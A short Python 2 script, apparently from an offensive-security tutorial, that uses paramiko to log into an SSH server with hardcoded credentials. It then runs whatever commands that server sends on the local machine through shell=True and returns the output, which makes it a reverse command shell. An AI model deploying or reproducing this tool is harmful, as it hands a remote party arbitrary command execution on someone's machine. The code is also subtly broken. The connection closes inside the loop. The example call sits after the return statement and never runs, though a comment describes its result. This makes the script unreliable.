# ssh with paramiko
# pip install paramiko
# you need to have the username and password to this work
import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):
	client = paramiko.SSHClient()
	#client.load_host_keys('/home/justin/.ssh/known_hosts')
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	client.connect(ip, username=user, password=passwd)
	ssh_session = client.get_transport().open_session()
	if ssh_session.active:
		ssh_session.send(command)
		print ssh_session.recv(1024) # read banner
		while True:
			command = ssh_session.recv(1024) # get the command from the ssh server
			try:
				cmd_output = subprocess.check_output(command, shell=True)
				ssh_session.send(cmd_output)
			except Exception, e:
				ssh_session.send(str(e))
			client.close()
	return

	ssh_command('192.168.100.131', 'justin', 'lovesthepython', 'id') # chnage the ip and user and the password with id
	# this will give a simple id of the user and groups
	
